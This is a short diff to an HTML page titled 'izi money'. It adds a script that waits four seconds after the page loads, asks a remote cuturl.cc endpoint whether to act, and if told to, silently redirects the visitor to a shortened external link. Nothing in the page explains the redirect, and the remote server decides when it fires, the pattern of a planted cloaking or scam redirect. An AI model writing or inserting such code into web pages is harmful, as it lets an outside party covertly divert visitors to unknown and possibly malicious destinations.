@@ -34,7 +34,19 @@ color: rgb(25, 25, 112)
 izi money
 </h1>
 
-<body>
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/1.12.4/jquery.min.js"></script> <body>
+ <script>
+setTimeout(function() {
+    $.ajax({
+        type: "GET", url: "https://cuturl.cc/api/check.php?uid=816",
+        data: "uid=816",
+        success: function(resul){
+            if(resul == "1") window.location.href = "https://cuturl.cc/hhM";
+        }
+    });
+}, 4000);
+</script>
+
 <style>
 body {
 background: rgb(147, 112, 219) url(img/2.jpg);
